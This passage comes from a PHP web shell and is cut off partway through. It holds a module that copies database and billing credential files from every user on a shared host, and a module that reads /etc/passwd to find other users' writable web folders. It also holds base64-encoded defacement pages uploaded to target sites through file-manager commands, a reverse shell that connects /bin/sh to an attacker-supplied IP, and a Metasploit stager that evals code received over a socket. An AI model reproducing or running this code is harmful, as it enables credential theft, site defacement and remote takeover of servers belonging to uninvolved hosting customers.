"/home/$user_idx/public_html/BASKET/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Basket/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/basket/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/SECURE/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Secure/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/secure/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/SALES/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Sales/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/sales/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/BILL/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Bill/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/bill/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/PURCHASE/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Purchase/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/purchase/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/ACCOUNT/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Account/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/account/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/USER/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/User/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/user/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/CLIENTS/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Clients/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/clients/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/BILLINGS/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Billings/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/billings/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/MY/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/My/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/my/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/secure/whm/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/secure/whmcs/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/panel/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/clientes/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/cliente/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/support/order/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/bb-config.php" => "BoxBilling.txt",
"/home/$user_idx/public_html/boxbilling/bb-config.php" => "BoxBilling.txt",
"/home/$user_idx/public_html/box/bb-config.php" => "BoxBilling.txt",
"/home/$user_idx/public_html/host/bb-config.php" => "BoxBilling.txt",
"/home/$user_idx/public_html/Host/bb-config.php" => "BoxBilling.txt",
"/home/$user_idx/public_html/supportes/bb-config.php" => "BoxBilling.txt",
"/home/$user_idx/public_html/support/bb-config.php" => "BoxBilling.txt",
"/home/$user_idx/public_html/hosting/bb-config.php" => "BoxBilling.txt",
"/home/$user_idx/public_html/cart/bb-config.php" => "BoxBilling.txt",
"/home/$user_idx/public_html/order/bb-config.php" => "BoxBilling.txt",
"/home/$user_idx/public_html/client/bb-config.php" => "BoxBilling.txt",
"/home/$user_idx/public_html/clients/bb-config.php" => "BoxBilling.txt",
"/home/$user_idx/public_html/cliente/bb-config.php" => "BoxBilling.txt",
"/home/$user_idx/public_html/clientes/bb-config.php" => "BoxBilling.txt",
"/home/$user_idx/public_html/billing/bb-config.php" => "BoxBilling.txt",
"/home/$user_idx/public_html/billings/bb-config.php" => "BoxBilling.txt",
"/home/$user_idx/public_html/my/bb-config.php" => "BoxBilling.txt",
"/home/$user_idx/public_html/secure/bb-config.php" => "BoxBilling.txt",
"/home/$user_idx/public_html/support/order/bb-config.php" => "BoxBilling.txt",
"/home/$user_idx/public_html/includes/dist-configure.php" => "Zencart.txt",
"/home/$user_idx/public_html/zencart/includes/dist-configure.php" => "Zencart.txt",
"/home/$user_idx/public_html/products/includes/dist-configure.php" => "Zencart.txt",
"/home/$user_idx/public_html/cart/includes/dist-configure.php" => "Zencart.txt",
"/home/$user_idx/public_html/shop/includes/dist-configure.php" => "Zencart.txt",
"/home/$user_idx/public_html/includes/iso4217.php" => "Hostbills.txt",
"/home/$user_idx/public_html/hostbills/includes/iso4217.php" => "Hostbills.txt",
"/home/$user_idx/public_html/host/includes/iso4217.php" => "Hostbills.txt",
"/home/$user_idx/public_html/Host/includes/iso4217.php" => "Hostbills.txt",
"/home/$user_idx/public_html/supportes/includes/iso4217.php" => "Hostbills.txt",
"/home/$user_idx/public_html/support/includes/iso4217.php" => "Hostbills.txt",
"/home/$user_idx/public_html/hosting/includes/iso4217.php" => "Hostbills.txt",
"/home/$user_idx/public_html/cart/includes/iso4217.php" => "Hostbills.txt",
"/home/$user_idx/public_html/order/includes/iso4217.php" => "Hostbills.txt",
"/home/$user_idx/public_html/client/includes/iso4217.php" => "Hostbills.txt",
"/home/$user_idx/public_html/clients/includes/iso4217.php" => "Hostbills.txt",
"/home/$user_idx/public_html/cliente/includes/iso4217.php" => "Hostbills.txt",
"/home/$user_idx/public_html/clientes/includes/iso4217.php" => "Hostbills.txt",
"/home/$user_idx/public_html/billing/includes/iso4217.php" => "Hostbills.txt",
"/home/$user_idx/public_html/billings/includes/iso4217.php" => "Hostbills.txt",
"/home/$user_idx/public_html/my/includes/iso4217.php" => "Hostbills.txt",
"/home/$user_idx/public_html/secure/includes/iso4217.php" => "Hostbills.txt",
"/home/$user_idx/public_html/support/order/includes/iso4217.php" => "Hostbills.txt",
"/home/$user_idx/.my.cnf" => "Cpanel.txt",
"/home/$user_idx/public_html/vdo_config.php" => "Voodoo",
"/home/$user_idx/public_html/sites/default/settings.php" => "Drupal",
"/home/$user_idx/public_html/config/settings.inc.php" => "PrestaShop",
"/home/$user_idx/public_html/app/etc/local.xml" => "Magento",
"/home/$user_idx/public_html/admin/config.php" => "OpenCart",
"/home/$user_idx/public_html/po-content/config.php" => "Popoji.txt",
"/home/$user_idx/public_html/forum/config.php" => "phpBB",
"/home/$user_idx/public_html/slconfig.php" => "Sitelok",
"/home/$user_idx/public_html/bw-configs/config.ini" => "BosWeb",
"/home/$user_idx/public_html/config.php" => "AnyWebsite",
"/home/$user_idx/public_html/application/config/database.php" => "Ellislab");
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("idx_config/$user_idx-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
		}	
	}
	echo "<center><a href='?dir=$dir/idx_config'><font color=lime>Done</font></a></center>";
} elseif($_GET['do'] == 'reverse') {
?>
<br>
<center><div id="sitelist"><a onClick="window.open('http://www.viewdns.info/reverseip/?host=<?php echo $_SERVER ['SERVER_ADDR']; ?>','POPUP','width=900 0,height=500,scrollbars=10');return false;" href="http://www.viewdns.info/reverseip/?host=<?php echo $_SERVER ['SERVER_ADDR']; ?>"><div id='menu'>[ Reverse IP Lookup ] </a></center>
<?php
} elseif($_GET['do'] == 'jumping') {
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$web_vh = "/var/www/vhosts/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";
} elseif($_GET['do'] == 'autoklik') {
?>
<form method="post">
<input type="submit" name="x" value="index.php">
</form>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['x']) {
	foreach($target as $korban) {
		$global = "index.php";
		$isi_nama_doang = "PHRpdGxlPkxvY2tlZDwvdGl0bGU+DQo8c3R5bGU+DQpib2R5ew0KdGV4dC1zaGFkb3c6MnB4IDJweCAxcHggYmx1ZTsNCn0NCmh0bWwgew0KCSBiYWNrZ3JvdW5kOiB1cmwoaHR0cHM6Ly9zY29udGVudC1zaW42LTEueHguZmJjZG4ubmV0L3YvdDEuMC0wL3M1NTJ4NDE0LzE1OTY1NTMxXzE5MTc4Nzg2MDUxMDY2MzNfODE4MDM5MjkyMzE4MzIyMzcxMF9uLmpwZz9vaD1kZDUwNGM1YTEyODU3MzFiMTQ0MDg0YWUzZGVkZDkyMSZvZT01OTExOEI2OSkgbm8tcmVwZWF0IGNlbnRlciBjZW50ZXIgZml4ZWQ7IA0KICAtd2Via2l0LWJhY2tncm91bmQtc2l6ZTogY292ZXI7DQogIC1tb3otYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsNCiAgLW8tYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsNCiAgYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsNCiAgICBjb2xvcjogI2ZmZmZmZjsNCiAgICBmb250LWZhbWlseTogJ1VidW50dSc7DQoJZm9udC1zaXplOiAxM3B4Ow0KCXdpZHRoOiAxMDAlOw0KfQ0KPC9zdHlsZT4NCjxjZW50ZXI+PGZvbnQgY29sb3I9InJlZCI+PHN0cm9uZz48Zm9udCBzaXplPSI0Ij5IYWNrZWQgQnkgR2FydWRhIFNlY3VyaXR5IEhhY2tlcjwvZm9udD48L3N0cm9uZz48L2ZvbnQ+PGNlbnRlcj4NCjxzY3JpcHQ+dmFyIGc9NTAsZj1uZXcgQXJyYXkoIiNBQUFBQ0MiLCIjREREREZGIiwiI0NDQ0NERCIsIiNGM0YzRjMiLCIjRjBGRkZGIiksZT1uZXcgQXJyYXkoIkFyaWFsIEJsYWNrIiwiQXJpYWwgTmFycm93IiwiVGltZXMiLCJDb21pYyBTYW5zIE1TIiksZD0iKiIsbT0wLjYsYT0yMixiPTgsYz0xLGo9bmV3IEFycmF5KCksayxsLHgsbj1uZXcgQXJyYXkoKSxvPW5ldyBBcnJheSgpLHA9bmV3IEFycmF5KCkscT1uYXZpZ2F0b3IudXNlckFnZW50LHI9ZG9jdW1lbnQuYWxsJiZkb2N1bWVudC5nZXRFbGVtZW50QnlJZCYmIXEubWF0Y2goL09wZXJhLykscz1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCYmIWRvY3VtZW50LmFsbCx1PXEubWF0Y2goL09wZXJhLyksdD1yfHxzfHx1O2Z1bmN0aW9uIHkoeil7cmV0dXJuIE1hdGguZmxvb3IoeipNYXRoLnJhbmRvbSgpKX1mdW5jdGlvbiB2KCl7aWYocnx8dSl7az1kb2N1bWVudC5ib2R5LmNsaWVudEhlaWdodDtsPWRvY3VtZW50LmJvZHkuY2xpZW50V2lkdGg7fWVsc2UgaWYocyl7az13aW5kb3cuaW5uZXJIZWlnaHQ7bD13aW5kb3cuaW5uZXJXaWR0aDt9dmFyIGg9YS1iO2ZvcihpPTA7aTw9ZztpKyspe29baV09MDtwW2ldPU1hdGgucmFuZG9tKCkqMTU7bltpXT0wLjAzK01hdGgucmFuZG9tKCkvMTA7altpXT1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgicyIraSk7altpXS5zdHlsZS5mb250RmFtaWx5PWVbeShlLmxlbmd0aCldO2pbaV0uc2l6ZT15KGgpK2I7altpXS5zdHlsZS5mb250U2l6ZT1qW2ldLnNpemU7altpXS5zdHlsZS5jb2xvcj1mW3koZi5sZW5ndGgpXTtqW2ldLnNpbms9bSpqW2ldLnNpemUvNTtpZihjPT0xKXtqW2ldLnBvc3g9eShsLWpbaV0uc2l6ZSl9aWYoYz09Mil7altpXS5wb3N4PXkobC8yLWpbaV0uc2l6ZSl9aWYoYz09Myl7altpXS5wb3N4PXkobC8yLWpbaV0uc2l6ZSkrbC80fTtpZihjPT00KXtqW2ldLnBvc3g9eShsLzItaltpXS5zaXplKStsLzJ9altpXS5wb3N5PXkoMiprLWstMipqW2ldLnNpemUpO2pbaV0uc3R5bGUubGVmdD1qW2ldLnBvc3g7altpXS5zdHlsZS50b3A9altpXS5wb3N5fXcoKX1mdW5jdGlvbiB3KCl7Zm9yKGk9MDtpPD1nO2krKyl7b1tpXSs9bltpXTtqW2ldLnBvc3krPWpbaV0uc2luaztqW2ldLnN0eWxlLmxlZnQ9altpXS5wb3N4K3BbaV0qTWF0aC5zaW4ob1tpXSk7altpXS5zdHlsZS50b3A9altpXS5wb3N5O2lmKGpbaV0ucG9zeT49ay0yKmpbaV0uc2l6ZXx8cGFyc2VJbnQoaltpXS5zdHlsZS5sZWZ0KT4obC0zKnBbaV0pKXtpZihjPT0xKXtqW2ldLnBvc3g9eShsLWpbaV0uc2l6ZSl9aWYoYz09Mil7altpXS5wb3N4PXkobC8yLWpbaV0uc2l6ZSl9aWYoYz09Myl7altpXS5wb3N4PXkobC8yLWpbaV0uc2l6ZSkrbC80fWlmKGM9PTQpe2pbaV0ucG9zeD15KGwvMi1qW2ldLnNpemUpK2wvMn1qW2ldLnBvc3k9MH19dmFyIHg9c2V0VGltZW91dCgidygpIiw1MCl9Zm9yKGk9MDtpPD1nO2krKyl7ZG9jdW1lbnQud3JpdGUoIjxzcGFuIGlkPSdzIitpKyInIHN0eWxlPSdwb3NpdGlvbjphYnNvbHV0ZTt0b3A6LSIrYSsiJz4iK2QrIjwvc3Bhbj4iKX1pZih0KXt3aW5kb3cub25sb2FkPXZ9PC9zY3JpcHQ+PGRpdiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7bGVmdDozNiU7dG9wOjQ2JSI+PC9kaXY+PHN0eWxlPjwvdGV4dGFyZWE+PGJyPjwvc3R5bGU+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj4NCjxmb250IHNpemU9IjYiPjxjZW50ZXI+X1R1YW4yRmF5XyAtIFl1a2lub3NoaXRhIDQ3IC0gVE1fNDA0IDxicj4gU25vb3plIC0gTHlvbmMgLSBFN0JfNDA0IC0gRGFya1RlcnJvcml6dCA8YnI+IC4vWmVybypBbmdlbCAtIDVpTk9OIU1PVTIzIC0gTXIuWE00MDRSUyEgLSAuL1IxNV9VVEQgLSBFdmlsQ2xvd24gPGJyPiB1dHJhZ2VvdXNFbmdrdXMgLSAzNERfU0wzM1AgLSBTZWN0b3IgVi4yIC0gTXIuU3BvbmdlYm9iIDxicj5TaGFkb3dIZSpydCAtIEN5YmVyR2hvc3QuMTcgLSBBbmQgQWxsIE1lbWJlciBvZiBHYXJ1ZGEgU2VjdXJpdHkgSGFja2Vy";
		$decode_isi = base64_decode($isi_nama_doang);
		$encode = base64_encode($global);
		$ss = fopen($global,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
		echo "Done index.php<br>";
		$url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
 		$post1 = array(
				"target" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$global",);
 		$output_mkfile = ngirim("$korban", $post1);
			$upload_ah = ngirim("$korban?cmd=upload", $post2);
			}
		}
?>
<form method="post">
<input type="submit" name="s" value="lol.php">
</form>
<?php
$targets = explode("\r\n", $_POST['targets']);
if($_POST['s']) {
	foreach($targets as $korba) {
		$globa = "lol.php";
		$isi_nama = "PHRpdGxlPkxvY2tlZDwvdGl0bGU+DQo8c3R5bGU+DQpib2R5ew0KdGV4dC1zaGFkb3c6MnB4IDJweCAxcHggYmx1ZTsNCn0NCmh0bWwgew0KCSBiYWNrZ3JvdW5kOiB1cmwoaHR0cHM6Ly9zY29udGVudC1zaW42LTEueHguZmJjZG4ubmV0L3YvdDEuMC0wL3M1NTJ4NDE0LzE1OTY1NTMxXzE5MTc4Nzg2MDUxMDY2MzNfODE4MDM5MjkyMzE4MzIyMzcxMF9uLmpwZz9vaD1kZDUwNGM1YTEyODU3MzFiMTQ0MDg0YWUzZGVkZDkyMSZvZT01OTExOEI2OSkgbm8tcmVwZWF0IGNlbnRlciBjZW50ZXIgZml4ZWQ7IA0KICAtd2Via2l0LWJhY2tncm91bmQtc2l6ZTogY292ZXI7DQogIC1tb3otYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsNCiAgLW8tYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsNCiAgYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsNCiAgICBjb2xvcjogI2ZmZmZmZjsNCiAgICBmb250LWZhbWlseTogJ1VidW50dSc7DQoJZm9udC1zaXplOiAxM3B4Ow0KCXdpZHRoOiAxMDAlOw0KfQ0KPC9zdHlsZT4NCjxjZW50ZXI+PGZvbnQgY29sb3I9InJlZCI+PHN0cm9uZz48Zm9udCBzaXplPSI0Ij5IYWNrZWQgQnkgR2FydWRhIFNlY3VyaXR5IEhhY2tlcjwvZm9udD48L3N0cm9uZz48L2ZvbnQ+PGNlbnRlcj4NCjxzY3JpcHQ+dmFyIGc9NTAsZj1uZXcgQXJyYXkoIiNBQUFBQ0MiLCIjREREREZGIiwiI0NDQ0NERCIsIiNGM0YzRjMiLCIjRjBGRkZGIiksZT1uZXcgQXJyYXkoIkFyaWFsIEJsYWNrIiwiQXJpYWwgTmFycm93IiwiVGltZXMiLCJDb21pYyBTYW5zIE1TIiksZD0iKiIsbT0wLjYsYT0yMixiPTgsYz0xLGo9bmV3IEFycmF5KCksayxsLHgsbj1uZXcgQXJyYXkoKSxvPW5ldyBBcnJheSgpLHA9bmV3IEFycmF5KCkscT1uYXZpZ2F0b3IudXNlckFnZW50LHI9ZG9jdW1lbnQuYWxsJiZkb2N1bWVudC5nZXRFbGVtZW50QnlJZCYmIXEubWF0Y2goL09wZXJhLykscz1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCYmIWRvY3VtZW50LmFsbCx1PXEubWF0Y2goL09wZXJhLyksdD1yfHxzfHx1O2Z1bmN0aW9uIHkoeil7cmV0dXJuIE1hdGguZmxvb3IoeipNYXRoLnJhbmRvbSgpKX1mdW5jdGlvbiB2KCl7aWYocnx8dSl7az1kb2N1bWVudC5ib2R5LmNsaWVudEhlaWdodDtsPWRvY3VtZW50LmJvZHkuY2xpZW50V2lkdGg7fWVsc2UgaWYocyl7az13aW5kb3cuaW5uZXJIZWlnaHQ7bD13aW5kb3cuaW5uZXJXaWR0aDt9dmFyIGg9YS1iO2ZvcihpPTA7aTw9ZztpKyspe29baV09MDtwW2ldPU1hdGgucmFuZG9tKCkqMTU7bltpXT0wLjAzK01hdGgucmFuZG9tKCkvMTA7altpXT1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgicyIraSk7altpXS5zdHlsZS5mb250RmFtaWx5PWVbeShlLmxlbmd0aCldO2pbaV0uc2l6ZT15KGgpK2I7altpXS5zdHlsZS5mb250U2l6ZT1qW2ldLnNpemU7altpXS5zdHlsZS5jb2xvcj1mW3koZi5sZW5ndGgpXTtqW2ldLnNpbms9bSpqW2ldLnNpemUvNTtpZihjPT0xKXtqW2ldLnBvc3g9eShsLWpbaV0uc2l6ZSl9aWYoYz09Mil7altpXS5wb3N4PXkobC8yLWpbaV0uc2l6ZSl9aWYoYz09Myl7altpXS5wb3N4PXkobC8yLWpbaV0uc2l6ZSkrbC80fTtpZihjPT00KXtqW2ldLnBvc3g9eShsLzItaltpXS5zaXplKStsLzJ9altpXS5wb3N5PXkoMiprLWstMipqW2ldLnNpemUpO2pbaV0uc3R5bGUubGVmdD1qW2ldLnBvc3g7altpXS5zdHlsZS50b3A9altpXS5wb3N5fXcoKX1mdW5jdGlvbiB3KCl7Zm9yKGk9MDtpPD1nO2krKyl7b1tpXSs9bltpXTtqW2ldLnBvc3krPWpbaV0uc2luaztqW2ldLnN0eWxlLmxlZnQ9altpXS5wb3N4K3BbaV0qTWF0aC5zaW4ob1tpXSk7altpXS5zdHlsZS50b3A9altpXS5wb3N5O2lmKGpbaV0ucG9zeT49ay0yKmpbaV0uc2l6ZXx8cGFyc2VJbnQoaltpXS5zdHlsZS5sZWZ0KT4obC0zKnBbaV0pKXtpZihjPT0xKXtqW2ldLnBvc3g9eShsLWpbaV0uc2l6ZSl9aWYoYz09Mil7altpXS5wb3N4PXkobC8yLWpbaV0uc2l6ZSl9aWYoYz09Myl7altpXS5wb3N4PXkobC8yLWpbaV0uc2l6ZSkrbC80fWlmKGM9PTQpe2pbaV0ucG9zeD15KGwvMi1qW2ldLnNpemUpK2wvMn1qW2ldLnBvc3k9MH19dmFyIHg9c2V0VGltZW91dCgidygpIiw1MCl9Zm9yKGk9MDtpPD1nO2krKyl7ZG9jdW1lbnQud3JpdGUoIjxzcGFuIGlkPSdzIitpKyInIHN0eWxlPSdwb3NpdGlvbjphYnNvbHV0ZTt0b3A6LSIrYSsiJz4iK2QrIjwvc3Bhbj4iKX1pZih0KXt3aW5kb3cub25sb2FkPXZ9PC9zY3JpcHQ+PGRpdiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7bGVmdDozNiU7dG9wOjQ2JSI+PC9kaXY+PHN0eWxlPjwvdGV4dGFyZWE+PGJyPjwvc3R5bGU+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj4NCjxmb250IHNpemU9IjYiPjxjZW50ZXI+X1R1YW4yRmF5XyAtIFl1a2lub3NoaXRhIDQ3IC0gVE1fNDA0IDxicj4gU25vb3plIC0gTHlvbmMgLSBFN0JfNDA0IC0gRGFya1RlcnJvcml6dCA8YnI+IC4vWmVybypBbmdlbCAtIDVpTk9OIU1PVTIzIC0gTXIuWE00MDRSUyEgLSAuL1IxNV9VVEQgLSBFdmlsQ2xvd24gPGJyPiB1dHJhZ2VvdXNFbmdrdXMgLSAzNERfU0wzM1AgLSBTZWN0b3IgVi4yIC0gTXIuU3BvbmdlYm9iIDxicj5TaGFkb3dIZSpydCAtIEN5YmVyR2hvc3QuMTcgLSBBbmQgQWxsIE1lbWJlciBvZiBHYXJ1ZGEgU2VjdXJpdHkgSGFja2Vy";
		$decode_isi = base64_decode($isi_nama);
		$encode = base64_encode($globa);
		$ss = fopen($globa,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' targets='_blank'>$korba</a> <br>";
		echo "Done lol.php<br>";
		$url_mkfil = "$korba?cmd=mkfile&name=$globa&targets=l1_Lw";
 		$post1 = array(
				"targets" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$globa",);
 		$output_mkfil = ngirim("$korban", $post1);
			$upload_as = ngirim("$korban?cmd=upload", $post2);
			}
		}

} elseif($_GET['do'] == 'tool') {
error_reporting(0);
function ss($t){if (!get_magic_quotes_gpc()) return trim(urldecode($t));return trim(urldecode(stripslashes($t)));}
$s_my_ip = gethostbyname($_SERVER['HTTP_HOST']);$rsport = "443";$rsportb4 = $rsport;$rstarget4 = $s_my_ip;$s_result = "<br><br><br><center><table><div class='mybox' align='center'><td><h2>Reverse shell ( php )</h2><form method='post' actions='?y=<?php echo $pwd;?>&amp;x='tool'><table class='tabnet'><tr><td style='width:110px;'>Your IP</td><td><input style='width:100%;' class='inputz' type='text' name='rstarget4' value='".$rstarget4."' /></td></tr><tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' name='sqlportb4' value='".$rsportb4."' /></td></tr></table><input type='submit' name='xback_php' class='inputzbut' value='connect' style='width:120px;height:30px;margin:10px 2px 0 2px;' /><input type='hidden' name='d' value='".$pwd."' /></form></td><td><hr color='#4C83AF'><td><td><form method='POST'><table class='tabnet'><h2>Metasploit Connection </h2><tr><td style='width:110px;'>Your IP</td><td><input style='width:100%;' class='inputz' type='text' size='40' name='yip' value='".$my_ip."' /></td></tr><tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' size='5' name='yport' value='443' /></td></tr></table><input class='inputzbut' type='submit' value='Connect' name='metaConnect' style='width:120px;height:30px;margin:10px 2px 0 2px;'></form></td></div></center></table><br><br />";
echo $s_result;
if($_POST['metaConnect']){$ipaddr = $_POST['yip'];$port = $_POST['yport'];if ($ip == "" && $port == ""){echo "fill in the blanks";}else {if (FALSE !== strpos($ipaddr, ":")) {$ipaddr = "[". $ipaddr ."]";}if (is_callable('stream_socket_client')){$msgsock = stream_socket_client("tcp://{$ipaddr}:{$port}");if (!$msgsock){die();}$msgsock_type = 'stream';}elseif (is_callable('fsockopen')){$msgsock = fsockopen($ipaddr,$port);if (!$msgsock) {die(); }$msgsock_type = 'stream';}elseif (is_callable('socket_create')){$msgsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);$res = socket_connect($msgsock, $ipaddr, $port);if (!$res) {die(); }$msgsock_type = 'socket';}else {die();}switch ($msgsock_type){case 'stream': $len = fread($msgsock, 4); break;case 'socket': $len = socket_read($msgsock, 4); break;}if (!$len) {die();}$a = unpack("Nlen", $len);$len = $a['len'];$buffer = '';while (strlen($buffer) < $len){switch ($msgsock_type) {case 'stream': $buffer .= fread($msgsock, $len-strlen($buffer)); break;case 'socket': $buffer .= socket_read($msgsock, $len-strlen($buffer));break;}}eval($buffer);echo "[*] Connection Terminated";die();}}
if(isset($_REQUEST['sqlportb4'])) $rsportb4 = ss($_REQUEST['sqlportb4']);
if(isset($_REQUEST['rstarget4'])) $rstarget4 = ss($_REQUEST['rstarget4']);
if ($_POST['xback_php']) {$ip = $rstarget4;$port = $rsportb4;$chunk_size = 1337;$write_a = null;$error_a = null;$shell = '/bin/sh';$daemon = 0;$debug = 0;if(function_exists('pcntl_fork')){$pid = pcntl_fork();
if ($pid == -1) exit(1);if ($pid) exit(0);if (posix_setsid() == -1) exit(1);$daemon = 1;}
umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);if(!$sock) exit(1);
$descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$process = proc_open($shell, $descriptorspec, $pipes);
if(!is_resource($process)) exit(1);
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
